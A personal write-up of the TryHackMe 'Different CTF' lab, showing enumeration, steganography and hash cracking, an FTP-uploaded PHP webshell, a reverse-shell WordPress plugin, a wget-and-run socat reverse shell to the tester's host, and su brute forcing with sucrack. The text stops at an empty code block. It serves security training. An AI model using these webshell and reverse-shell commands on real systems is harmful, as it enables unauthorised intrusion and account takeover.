# Different CTF

## Introduction

Welcome to my another writeup! In this TryHackMe [M4tr1x: Exit Denied](https://tryhackme.com/room/m4tr1xexitdenied) room, you'll learn: Exploiting and enumerating MyBB, brute forcing OTP (One-Time Password) and more! Without further ado, let's dive in.

- Overall difficulty for me (From 1-10 stars): ★★★★★★★☆☆☆

## Table of Content

1. **[Service Enumeration](#service-enumeration)**
2. **[Initial Foothold](#initial-foothold)**
3. **[Privilege Escalation: www-data to hakanftp](#privilege-escalation)**
3. **[Privilege Escalation: hakanftp to hakanbey](#hakanftp-to-hakanbey)**
3. **[Privilege Escalation: hakanbey to root](#hakanbey-to-root)**
4. **[Conclusion](#conclusion)**

## Background

> interesting room, you can shoot the sun
>  
> Difficulty: Hard

---

Hello there

We will tend to think differently in this room.

In fact, we will understand that what we see is not what we think, and if you go beyond the purpose, you will disappear in the room, fall into a rabbit hole.

## Task 1 - Basic scan

## Service Enumeration

As usual, scan the machine for open ports via `rustscan`!

**Rustscan:**
```shell
┌[siunam♥earth]-(~/ctf/thm/ctf/Different-CTF)-[2023.01.30|14:10:16(HKT)]
└> export RHOSTS=10.10.152.107                                    
┌[siunam♥earth]-(~/ctf/thm/ctf/Different-CTF)-[2023.01.30|14:11:38(HKT)]
└> rustscan --ulimit 5000 -b 4500 -t 2000 --range 1-65535 $RHOSTS -- -sC -sV -oN rustscan/rustscan.txt
[...]
PORT   STATE SERVICE REASON  VERSION
21/tcp open  ftp     syn-ack vsftpd 3.0.3
80/tcp open  http    syn-ack Apache httpd 2.4.29
|_http-generator: WordPress 5.6
|_http-title: Hello World &#8211; Just another WordPress site
|_http-server-header: Apache/2.4.29 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
Service Info: Host: 127.0.1.1; OS: Unix
```

According to `rustscan` result, we have 2 ports are opened:

|Open Port         | Service                       |
|:---:             |:---:                          |
|21                | vsftpd 3.0.3                  |
|80                | Apache/2.4.29 (Ubuntu)        |

### Question 1 - How many ports are open ?

- **Answer: `2`**

### FTP on Port 21

**We can try to login as `anonymous` (Guess login):**
```shell
┌[siunam♥earth]-(~/ctf/thm/ctf/Different-CTF)-[2023.01.30|14:12:51(HKT)]
└> ftp $RHOSTS     
Connected to 10.10.152.107.
220 (vsFTPd 3.0.3)
Name (10.10.152.107:siunam): anonymous
530 Permission denied.
ftp: Login failed
ftp> 
```

Nope. It doesn't allow `anonymous` login.

That being said, **we need credentials** to do futher enumeration!

### HTTP on Port 80

**Find domain name:**
```shell
┌[siunam♥earth]-(~/ctf/thm/ctf/Different-CTF)-[2023.01.30|14:15:58(HKT)]
└> curl -s http://$RHOSTS/ | grep -iE 'https?://.*\.thm'
[...]
<script src='http://adana.thm/wp-includes/js/wp-embed.min.js?ver=5.6' id='wp-embed-js'></script>
```

- Found domain: `adana.thm`

**Adding that new domain to `/etc/hosts`:**
```shell
┌[siunam♥earth]-(~/ctf/thm/ctf/Different-CTF)-[2023.01.30|14:19:05(HKT)]
└> echo "$RHOSTS adana.thm" | sudo tee -a /etc/hosts
```

**Home page:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Different-CTF/images/Pasted%20image%2020230130142108.png)

By combining `rustscan`'s result and the home page, we can confirm that the web application is using a CMS (Content Management System) called WordPress, and it's version is 5.6.

**In WordPress, we can use a vulnerability scanner called `wpscan`:**
```shell
┌[siunam♥earth]-(~/ctf/thm/ctf/Different-CTF)-[2023.01.30|14:26:22(HKT)]
└> wpscan --url http://adana.thm/
[...]
```

But nothing interesting.

**Nevermind. Let's use `gobuster` to enumerate hidden directories:**
```shell
┌[siunam♥earth]-(~/ctf/thm/ctf/Different-CTF)-[2023.01.30|14:19:28(HKT)]
└> gobuster dir -u http://adana.thm/ -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt -t 100
[...]
/javascript           (Status: 301) [Size: 311] [--> http://adana.thm/javascript/]
/phpmyadmin           (Status: 301) [Size: 311] [--> http://adana.thm/phpmyadmin/]
/wp-content           (Status: 301) [Size: 311] [--> http://adana.thm/wp-content/]
/wp-admin             (Status: 301) [Size: 309] [--> http://adana.thm/wp-admin/]
[...]
/announcements        (Status: 301) [Size: 314] [--> http://adana.thm/announcements/]
/server-status        (Status: 403) [Size: 274]
```

The `/announcements/` directory is NOT a default WordPress directory.

### Question 2 - What is the name of the secret directory ?

- **Answer: `/announcements/`**

**Let's check that out:**
```shell
┌[siunam♥earth]-(~/ctf/thm/ctf/Different-CTF)-[2023.01.30|14:26:50(HKT)]
└> curl -s http://adana.thm/announcements/ | html2text
****** Index of /announcements ******
[[ICO]]       Name                        Last_modified    Size Description
===========================================================================
[[PARENTDIR]] Parent_Directory                              - 
[[IMG]]       austrailian-bulldog-ant.jpg 2021-01-11 11:51  58K 
[[TXT]]       wordlist.txt                2021-01-11 13:48 394K 
===========================================================================
     Apache/2.4.29 (Ubuntu) Server at adana.thm Port 80
```

In here, we see that there are 2 files: `austrailian-bulldog-ant.jpg`, `wordlist.txt`

**Let's `wget` them:**
```shell
┌[siunam♥earth]-(~/ctf/thm/ctf/Different-CTF)-[2023.01.30|14:30:43(HKT)]
└> wget http://adana.thm/announcements/wordlist.txt
┌[siunam♥earth]-(~/ctf/thm/ctf/Different-CTF)-[2023.01.30|14:31:01(HKT)]
└> wget http://adana.thm/announcements/austrailian-bulldog-ant.jpg
```

**wordlist.txt:**
```shell
┌[siunam♥earth]-(~/ctf/thm/ctf/Different-CTF)-[2023.01.30|14:31:52(HKT)]
└> head wordlist.txt     
123456
12345
123456789
password
iloveyou
princess
1234567
rockyou
12345678
abc123
```

**austrailian-bulldog-ant.jpg:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Different-CTF/images/Pasted%20image%2020230130143227.png)

Hmm... Maybe the image itself has something hidden?

**Let's try to use `steghide` to extract that:**
```shell
┌[siunam♥earth]-(~/ctf/thm/ctf/Different-CTF)-[2023.01.30|14:32:31(HKT)]
└> steghide extract -sf austrailian-bulldog-ant.jpg 
Enter passphrase: 
steghide: could not extract any data with that passphrase!
```

It needs a passphrase.

**Since it also has a wordlist, why not using `stegseek` to crack it?**
```shell
┌[siunam♥earth]-(~/ctf/thm/ctf/Different-CTF)-[2023.01.30|14:34:13(HKT)]
└> stegseek austrailian-bulldog-ant.jpg wordlist.txt 
StegSeek 0.6 - https://github.com/RickdeJager/StegSeek

[i] Found passphrase: "123adana{Redacted}"
[i] Original filename: "user-pass-ftp.txt".
[i] Extracting to "austrailian-bulldog-ant.jpg.out".
┌[siunam♥earth]-(~/ctf/thm/ctf/Different-CTF)-[2023.01.30|14:34:45(HKT)]
└> mv austrailian-bulldog-ant.jpg.out user-pass-ftp.txt
```

Cracked!

**The extracted file is `user-pass-ftp.txt`!**
```shell
┌[siunam♥earth]-(~/ctf/thm/ctf/Different-CTF)-[2023.01.30|14:35:44(HKT)]
└> cat user-pass-ftp.txt 
RlRQLUxPR0lOClVTRVI{Redacted}U1M6IDEyM2FkYW5hY3JhY2s=
```

As you can see, it's base64 encoded! (The last character is `=`, which is a padding character in base64 encoding.)

**Let's use `base64` to decode that!**
```shell
┌[siunam♥earth]-(~/ctf/thm/ctf/Different-CTF)-[2023.01.30|14:36:28(HKT)]
└> base64 -d user-pass-ftp.txt 
FTP-LOGIN
USER: hakanftp
PASS: 123adana{Redacted}
```

We found a FTP credentials!

**Let's enumerate FTP again!**
```shell
┌[siunam♥earth]-(~/ctf/thm/ctf/Different-CTF)-[2023.01.30|14:26:26(HKT)]
└> ftp $RHOSTS
Connected to 10.10.152.107.
220 (vsFTPd 3.0.3)
Name (10.10.152.107:siunam): hakanftp
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> 
```

We're in!

**We can then list all the files and directories:**
```shell
ftp> ls -lah
229 Entering Extended Passive Mode (|||60057|)
150 Here comes the directory listing.
drwxrwxrwx    8 1001     1001         4096 Jan 15  2021 .
drwxrwxrwx    8 1001     1001         4096 Jan 15  2021 ..
-rw-------    1 1001     1001           88 Jan 13  2021 .bash_history
drwx------    2 1001     1001         4096 Jan 11  2021 .cache
drwx------    3 1001     1001         4096 Jan 11  2021 .gnupg
-rw-r--r--    1 1001     1001          554 Jan 10  2021 .htaccess
drwxr-xr-x    2 0        0            4096 Jan 14  2021 announcements
-rw-r--r--    1 1001     1001          405 Feb 06  2020 index.php
-rw-r--r--    1 1001     1001        19915 Feb 12  2020 license.txt
-rw-r--r--    1 1001     1001         7278 Jun 26  2020 readme.html
-rw-r--r--    1 1001     1001         7101 Jul 28  2020 wp-activate.php
drwxr-xr-x    9 1001     1001         4096 Dec 08  2020 wp-admin
-rw-r--r--    1 1001     1001          351 Feb 06  2020 wp-blog-header.php
-rw-r--r--    1 1001     1001         2328 Oct 08  2020 wp-comments-post.php
-rw-r--r--    1 0        0            3194 Jan 11  2021 wp-config.php
drwxr-xr-x    4 1001     1001         4096 Dec 08  2020 wp-content
-rw-r--r--    1 1001     1001         3939 Jul 30  2020 wp-cron.php
drwxr-xr-x   25 1001     1001        12288 Dec 08  2020 wp-includes
-rw-r--r--    1 1001     1001         2496 Feb 06  2020 wp-links-opml.php
-rw-r--r--    1 1001     1001         3300 Feb 06  2020 wp-load.php
-rw-r--r--    1 1001     1001        49831 Nov 09  2020 wp-login.php
-rw-r--r--    1 1001     1001         8509 Apr 14  2020 wp-mail.php
-rw-r--r--    1 1001     1001        20975 Nov 12  2020 wp-settings.php
-rw-r--r--    1 1001     1001        31337 Sep 30  2020 wp-signup.php
-rw-r--r--    1 1001     1001         4747 Oct 08  2020 wp-trackback.php
-rw-r--r--    1 1001     1001         3236 Jun 08  2020 xmlrpc.php
226 Directory send OK.
```

So, it seems like this FTP user can access to the WordPress website?

***If we can upload anything, we can gain RCE (Remote Code Execution)!***

**Let's try to upload a test file:**
```shell
┌[siunam♥earth]-(~/ctf/thm/ctf/Different-CTF)-[2023.01.30|14:40:38(HKT)]
└> touch anything

ftp> put anything 
local: anything remote: anything
[...]
226 Transfer complete.
ftp> ls -lah
[...]
-rw-------    1 1001     1001            0 Jan 30 06:40 anything
[...]
```

We can upload any files!

**Now, let's upload a PHP webshell:**
```shell
┌[siunam♥earth]-(~/ctf/thm/ctf/Different-CTF)-[2023.01.30|14:42:39(HKT)]
└> echo '<?php system($_GET["cmd"]) ?>' > webshell.php

ftp> put webshell.php 
local: webshell.php remote: webshell.php
```

**Then try to go to the webshell location:**
```shell
┌[siunam♥earth]-(~/ctf/thm/ctf/Different-CTF)-[2023.01.30|14:43:31(HKT)]
└> curl http://adana.thm/webshell.php                                
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>404 Not Found</title>
</head><body>
<h1>Not Found</h1>
<p>The requested URL was not found on this server.</p>
<hr>
<address>Apache/2.4.29 (Ubuntu) Server at adana.thm Port 80</address>
</body></html>
```

Wait. HTTP status 404 Not Found?

Let's take a step back.

Our uploaded file doesn't exist on the WordPress website, so maybe **it's on a different subdomain**?

But before we start fuzzing subdomains, let's try to download the `wp-config.php`, which holds database's credentials:

```shel
ftp> get wp-config.php
[...]

┌[siunam♥earth]-(~/ctf/thm/ctf/Different-CTF)-[2023.01.30|14:47:26(HKT)]
└> cat wp-config.php
[...]
// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define( 'DB_NAME', 'phpmyadmin1' );

/** MySQL database username */
define( 'DB_USER', 'phpmyadmin' );

/** MySQL database password */
define( 'DB_PASSWORD', '{Redacted}' );

/** MySQL hostname */
define( 'DB_HOST', 'localhost' );
[...]
```

Found MySQL credentials!

**We also found a `.bash_history` file, which is a command histories:**
```shell
ftp> get .bash_history
[...]

┌[siunam♥earth]-(~/ctf/thm/ctf/Different-CTF)-[2023.01.30|14:50:18(HKT)]
└> cat .bash_history 
id
su root
ls
cd ..
ls
cd /home
ls
cd hakanbey/
ls
ls -la
cd ..
ls
exit
ls
cd /
ls
exit
```

As you can see, **there is a system user called `hakankey`.**

Let's take a step back.

In `wp-config.php`, we found a MySQL credentials, and it has a username called `phpmyadmin`, which got me thinking the website has PHPMyAdmin.

**Let's go to `/phpmyadmin`:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Different-CTF/images/Pasted%20image%2020230131105823.png)

**Then login as user `phpmyadmin`:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Different-CTF/images/Pasted%20image%2020230131105955.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Different-CTF/images/Pasted%20image%2020230131110015.png)

Boom! We're in!

**As you can see, it has 2 databases that are interesting for us:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Different-CTF/images/Pasted%20image%2020230131110151.png)

- Found database: `phpmyadmin`, `phpmyadmin1`

Let's enumerate them!

The `wp_` prefix stands for WordPress, and table `wp_users` holds users' credentials!

**We can go to "SQL" to run SQL query:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Different-CTF/images/Pasted%20image%2020230131110435.png)

**To extract table `wp_users`, we can run the following SQL statement:**
```sql
use phpmyadmin;
SELECT * FROM wp_users;
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Different-CTF/images/Pasted%20image%2020230131110736.png)

We found a WordPress user's credentials!

However, the `user_pass` is a password hash!

**We can crack that via `john`:**
```shell
┌[siunam♥earth]-(~/ctf/thm/ctf/Different-CTF)-[2023.01.31|11:08:56(HKT)]
└> nano hakankey01.hash
┌[siunam♥earth]-(~/ctf/thm/ctf/Different-CTF)-[2023.01.31|11:10:58(HKT)]
└> john --wordlist=/usr/share/wordlists/rockyou.txt hakankey01.hash
[...]
```

However, I couldn't crack that hash...

**How about database `phpmyadmin1`?**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Different-CTF/images/Pasted%20image%2020230131111618.png)

As you can see, the password hash is different.

**Let's crack that again:**
```shell
┌[siunam♥earth]-(~/ctf/thm/ctf/Different-CTF)-[2023.01.31|11:17:02(HKT)]
└> john --wordlist=/usr/share/wordlists/rockyou.txt hakankey01_1.hash 
[...]
{Redacted}            (?)
```

Oh! Nice, we cracked that password hash!

**Armed with above information, we can try to login as user `hakankey01` in WordPress:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Different-CTF/images/Pasted%20image%2020230131111824.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Different-CTF/images/Pasted%20image%2020230131114815.png)

Unknown username??

**In the home page, we can find a username `hakanbey01`:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Different-CTF/images/Pasted%20image%2020230131114901.png)

Let's try it:

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Different-CTF/images/Pasted%20image%2020230131115023.png)

Still nope...

Again. Take a step back.

**After fumbling around in PHPMyAdmin and based on my hacking WordPress experiences, the subdomain can be found in table `wp_options`:**
```sql
use phpmyadmin1;
SELECT * FROM wp_options;
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Different-CTF/images/Pasted%20image%2020230131143716.png)

We found a new subdomain!

**Let's add that to `/etc/hosts`:**
```shell
┌[siunam♥earth]-(~/ctf/thm/ctf/Different-CTF)-[2023.01.31|14:24:18(HKT)]
└> sudo vi /etc/hosts
10.10.152.107 adana.thm subdomain.adana.thm
```

**`subdomain`:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Different-CTF/images/Pasted%20image%2020230131143935.png)

Nice! We found another WordPress!

**Let's try to access our PHP webshell again:**
```shell
┌[siunam♥earth]-(~/ctf/thm/ctf/Different-CTF)-[2023.01.31|14:40:35(HKT)]
└> curl http://subdomain.adana.thm/webshell.php --get --data-urlencode "cmd=id"
```

It does exist, but it seems like we don't have code execution??

Hmm... Let's try to upload a text file via FTP, and see what wil happened when we access it:

```shell
┌[siunam♥earth]-(~/ctf/thm/ctf/Different-CTF)-[2023.01.31|14:41:22(HKT)]
└> echo 'test' > test.txt

ftp> put test.txt

┌[siunam♥earth]-(~/ctf/thm/ctf/Different-CTF)-[2023.01.31|14:42:08(HKT)]
└> curl http://subdomain.adana.thm/test.txt
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>403 Forbidden</title>
</head><body>
<h1>Forbidden</h1>
<p>You don't have permission to access this resource.</p>
<hr>
<address>Apache/2.4.29 (Ubuntu) Server at subdomain.adana.thm Port 80</address>
</body></html>
```

What?? 403 Forbidden?

That sucks.

**Since we have cracked user `hakanbey01`'s password hash, we can try to login as that user in WordPress:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Different-CTF/images/Pasted%20image%2020230131144912.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Different-CTF/images/Pasted%20image%2020230131144944.png)

Nice! We're in, and this user has administrator privilege!

After getting administrator level access in WordPress, we can try to **upload a reverse shell plugin** to gain initial foothold.

**To do so, we can first write a reverse shell plugin:**
```shell
┌[siunam♥earth]-(~/ctf/thm/ctf/Different-CTF)-[2023.01.31|14:58:37(HKT)]
└> vi revshell.php                        
<?php

/**
* Plugin Name: WordPress Reverse Shell
* Author: siunam
*/
exec("/bin/bash -c 'bash -i >& /dev/tcp/10.9.0.253/443 0>&1'")
?>

┌[siunam♥earth]-(~/ctf/thm/ctf/Different-CTF)-[2023.01.31|14:58:43(HKT)]
└> zip revshell.zip revshell.php          
  adding: revshell.php (deflated 6%)
```

**Then upload it:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Different-CTF/images/Pasted%20image%2020230131150520.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Different-CTF/images/Pasted%20image%2020230131150531.png)

Nope. The parent directory is not writable.

## Initial Foothold

**After falling into rabbit holes, I found that our uploaded PHP webshell has a weird access privilege:**
```shell
ftp> ls -lah
[...]
-rw-------    1 1001     1001           30 Jan 31 06:40 webshell.php
[...]
```

As you can see, it only readable and writable by UID `1001`.

**That being said, we can `chmod` command to change it to world-readable/writable/executable:**
```shell
ftp> chmod 777 webshell.php
200 SITE CHMOD command ok.
```

**Now, we should able to execute our webshell code!**
```shell
┌[siunam♥earth]-(~/ctf/thm/ctf/Different-CTF)-[2023.01.31|15:25:04(HKT)]
└> curl http://subdomain.adana.thm/webshell.php --get --data-urlencode "cmd=id"
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Nice! We have code execution!

**Let's get a shell!**
```shell
┌[siunam♥earth]-(~/ctf/thm/ctf/Different-CTF)-[2023.02.02|09:07:18(HKT)]
└> socat -d -d file:`tty`,raw,echo=0 TCP-LISTEN:4444
2023/02/02 09:07:20 socat[8591] N opening character device "/dev/pts/1" for reading and writing
2023/02/02 09:07:20 socat[8591] N listening on AF=2 0.0.0.0:4444

┌[siunam♥earth]-(/opt/static-binaries/binaries/linux/x86_64)-[2023.02.02|09:06:27(HKT)]
└> python3 -m http.server 8000
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

```shell
┌[siunam♥earth]-(~/ctf/thm/ctf/Different-CTF)-[2023.02.02|09:07:23(HKT)]
└> curl http://subdomain.adana.thm/webshell.php --get --data-urlencode "cmd=wget http://10.9.0.253:8000/socat -O /tmp/socat;chmod +x /tmp/socat;/tmp/socat TCP:10.9.0.253:4444 EXEC:'/bin/bash',pty,stderr,setsid,sigint,sane"
```

```shell
┌[siunam♥earth]-(~/ctf/thm/ctf/Different-CTF)-[2023.02.02|09:07:18(HKT)]
└> socat -d -d file:`tty`,raw,echo=0 TCP-LISTEN:4444
2023/02/02 09:07:20 socat[8591] N opening character device "/dev/pts/1" for reading and writing
2023/02/02 09:07:20 socat[8591] N listening on AF=2 0.0.0.0:4444
                                                                2023/02/02 09:07:43 socat[8591] N accepting connection from AF=2 10.10.152.107:56364 on AF=2 10.9.0.253:4444
                                                                2023/02/02 09:07:43 socat[8591] N starting data transfer loop with FDs [5,5] and [7,7]
                                           www-data@ubuntu:/var/www/subdomain$ 
www-data@ubuntu:/var/www/subdomain$ export TERM=xterm-256color
www-data@ubuntu:/var/www/subdomain$ stty rows 22 columns 107
www-data@ubuntu:/var/www/subdomain$ whoami;hostname;id;ip a
www-data
ubuntu
uid=33(www-data) gid=33(www-data) groups=33(www-data)
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 9001 qdisc fq_codel state UP group default qlen 1000
    link/ether 02:e0:8b:fe:8b:6d brd ff:ff:ff:ff:ff:ff
    inet 10.10.152.107/16 brd 10.10.255.255 scope global eth0
       valid_lft forever preferred_lft forever
    inet6 fe80::e0:8bff:fefe:8b6d/64 scope link 
       valid_lft forever preferred_lft forever
www-data@ubuntu:/var/www/subdomain$ ^C
www-data@ubuntu:/var/www/subdomain$ 
```

I'm user `www-data`!

**Web flag:**
```shell
www-data@ubuntu:/var/www/subdomain$ cat /var/www/html/wwe3bbfla4g.txt
THM{Redacted}
```

## Privilege Escalation

### www-data to hakanftp

Let's do some basic enumerations!

**System users:**
```shell
www-data@ubuntu:/var/www/subdomain$ cat /etc/passwd | grep /bin/bash
root:x:0:0:root:/root:/bin/bash
hakanbey:x:1000:1000:hakanbey:/home/hakanbey:/bin/bash
hakanftp:x:1001:1001:,,,:/var/www/subdomain:/bin/bash
```

- Found 2 system user: `hakanbey`, `hakanftp`

**SUID binaries:**
```shell
www-data@ubuntu:/var/www/subdomain$ find / -perm -4000 2>/dev/null
```

Nothing?

**Capability:**
```shell
www-data@ubuntu:/var/www/subdomain$ getcap -r / 2>/dev/null
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
/usr/bin/mtr-packet = cap_net_raw+ep
/usr/bin/gnome-keyring-daemon = cap_ipc_lock+ep
```

Nothing weird.

**Now, since we have a FTP credentials, we can try to Switch User to `hakanftp`:**
```shell
www-data@ubuntu:/var/www/subdomain$ su hakanftp
Password: 
hakanftp@ubuntu:~$ whoami;hostname;id;ip a
hakanftp
ubuntu
uid=1001(hakanftp) gid=1001(hakanftp) groups=1001(hakanftp)
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 9001 qdisc fq_codel state UP group default qlen 1000
    link/ether 02:e0:8b:fe:8b:6d brd ff:ff:ff:ff:ff:ff
    inet 10.10.152.107/16 brd 10.10.255.255 scope global eth0
       valid_lft forever preferred_lft forever
    inet6 fe80::e0:8bff:fefe:8b6d/64 scope link 
       valid_lft forever preferred_lft forever
```

I'm user `hakanftp`!

### hakanftp to hakanbey

**Sudo permission:**
```
hakanftp@ubuntu:~$ sudo -l
[...]
Password: 
Sorry, user hakanftp may not run sudo on ubuntu.
```

Nope.

**Listening ports:**
```shell
hakanftp@ubuntu:~$ netstat -tunlp
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:22            0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:631           0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::80                   :::*                    LISTEN      -                   
tcp6       0      0 :::21                   :::*                    LISTEN      -                   
tcp6       0      0 ::1:631                 :::*                    LISTEN      -                   
udp        0      0 127.0.0.53:53           0.0.0.0:*                           -                   
udp        0      0 0.0.0.0:68              0.0.0.0:*                           -                   
udp        0      0 0.0.0.0:40524           0.0.0.0:*                           -                   
udp        0      0 0.0.0.0:631             0.0.0.0:*                           -                   
udp        0      0 0.0.0.0:5353            0.0.0.0:*                           -                   
udp6       0      0 :::5353                 :::*                                -                   
udp6       0      0 :::33043                :::*                                -
```

As you can see, **it has some local loopback listening ports: `22`, `631`, `3306`**

Port 3306 is MySQL, we already enumerated it in PHPMyAdmin.

**Port 631 is Internet Printing Protocol (IPP). This port is to provide printing service.**

> The Internet Printing Protocol (IPP) is defined in RFC2910 and RFC2911. It's an extendable protocol, for example ‘IPP Everywhere’ is a candidate for a standard in mobile and cloud printing and IPP extensions for 3D printing have been released. Because IPP is based on _HTTP_, it inherits all existing security features like basic/digest authentication and _SSL/TLS_ encryption. To submit a print job or to retrieve status information from the printer, an HTTP POST request is sent to the IPP server listening on **port 631/tcp**. A famous open-source IPP implementation is CUPS, which is the default printing system in many Linux distributions and OS X. Similar to LPD, IPP is a **channel** to deploy the actual data to be printed and can be abused as a carrier for malicious PostScript or PJL files. (From [HackTricks](https://book.hacktricks.xyz/network-services-pentesting/pentesting-631-internet-printing-protocol-ipp#internet-printing-protocol-ipp))

**That being said, we can try to `curl` port 631:**
```shell
hakanftp@ubuntu:~$ curl http://127.0.0.1:631/
<!DOCTYPE HTML>
<html>
  <head>
    <link rel="stylesheet" href="/cups.css" type="text/css">
    <link rel="shortcut icon" href="/apple-touch-icon.png" type="image/png">
    <meta charset="utf-8">
    <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=9">
    <meta name="viewport" content="width=device-width">
    <title>Home - CUPS 2.2.7</title>
  </head>
[...]
```

We found that the IPP implementation is **CUPS version 2.2.7.**

However, it seems like we couldn't exploit this...

Now, we can try to brute force user `hakankey`'s password.

We can do a port forwarding in SSH, and then brute force it via `hydra`.

**We can also brute force it via `sucrack`!**

> sucrack is a multithreaded Linux/UNIX tool for cracking local user accounts via wordlist bruteforcing su. This tool comes in handy when you’ve gained access to a low-privilege user account but are allowed to su to other users. Many su implementations require a pseudo terminal to be attached in order to take the password from the user. This can’t be easily achieved with a simple shell script. This tool, written in C, is highly efficient and can attempt multiple logins at the same time.

- Clone `sucrack` [repository](https://github.com/hemp3l/sucrack):

```shell
┌[siunam♥earth]-(/opt)-[2023.02.02|09:37:23(HKT)]
└> sudo git clone https://github.com/hemp3l/sucrack.git
```

- Transfer it to the target machine:

```shell
┌[siunam♥earth]-(/opt)-[2023.02.02|09:38:11(HKT)]
└> sudo zip -r sucrack.zip sucrack

┌[siunam♥earth]-(/opt)-[2023.02.02|09:38:14(HKT)]
└> python3 -m http.server 8000
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

```shell
hakanftp@ubuntu:~$ wget http://10.9.0.253:8000/sucrack.zip -O /tmp/sucrack.zip

hakanftp@ubuntu:~$ cd /tmp
hakanftp@ubuntu:/tmp$ unzip sucrack.zip
```

- Install `sucrack`:

```shell
hakanftp@ubuntu:/tmp$ cd sucrack
hakanftp@ubuntu:/tmp/sucrack$ ./configure
[...]
sucrack configuration
---------------------
sucrack version		: 1.2.3
target system           : LINUX
sucrack link flags      : -pthread
sucrack compile flags	: -DSTATIC_BUFFER  -DLINUX -DSUCRACK_TITLE="\"sucrack 1.2.3 (LINUX)\""
hakanftp@ubuntu:/tmp/sucrack$ make
[...]
```

```shell
hakanftp@ubuntu:/tmp/sucrack$ /tmp/sucrack/src/sucrack -h
sucrack 1.2.3 (LINUX) - the su cracker
Copyright (C) 2006  Nico Leidecker; nfl@portcullis-security.com

 Usage: /tmp/sucrack/src/sucrack [-char] [-w num] [-b size] [-s sec] [-u user] [-l rules] wordlist
[...]
 Environment Variables:
   SUCRACK_SU_PATH      : The path to su (usually /bin/su or /usr/bin/su)

   SUCRACK_AUTH_FAILURE : The message su returns on an authentication
                          failure (like "su: Authentication failure" or "su: Sorry")
   SUCRACK_AUTH_SUCCESS : The message that indicates an authentication
                          success. This message must not be a password
                          listed in the wordlist (default is "SUCRACK_SUCCESS")

 Example:
   export SUCRACK_AUTH_SUCCESS="sucrack_says_hello"
   /tmp/sucrack/src/sucrack -a -w 20 -s 10 -u root -rl AFLafld dict.txt
```

**We now can brute force user `hakanbey`!**

But, which wordlist should we use??

**If you look at the FTP user's password and `austrailian-bulldog-ant.jpg` steganography image file's passphrase, it has a pattern:**
```
123adana{Redacted}
123adana{Redacted}
```

It always **starts with `123adana` followed by some words**.

Also, we found a wordlsit in `/announcements/wordlist.txt`

**Armed with above information, we can modify the wordlist via appending the `123adana` prefix.**

**To do so, I'll write a simple Python script:**
```py
#!/usr/bin/env python3

class Modifier:
    def __init__(self, originalWordlist, modifiedWordlist, passwordPrefix):
        self.originalWordlist = originalWordlist
        self.modifiedWordlist = modifiedWordlist
        self.passwordPrefix = passwordPrefix

    def modifyWordlist(self):
        # Read original wordlist file's content
        with open(self.originalWordlist, 'r') as originalWordlist:
            for line in originalWordlist:
                wordlistString = line.strip()

                # Append the password prefix to original wordlist file
                with open(self.modifiedWordlist, 'a') as modifiedWordlist:
                    modifiedWordlist.write(f'{self.passwordPrefix}{wordlistString}\n')

def main():
    originalWordlist = 'wordlist.txt'
    modifiedWordlist = 'modified_wordlist.txt'
    passwordPrefix = '123adana'
    modifier = Modifier(originalWordlist, modifiedWordlist, passwordPrefix)

    modifier.modifyWordlist()

if __name__ == '__main__':
    main()
```

```shell
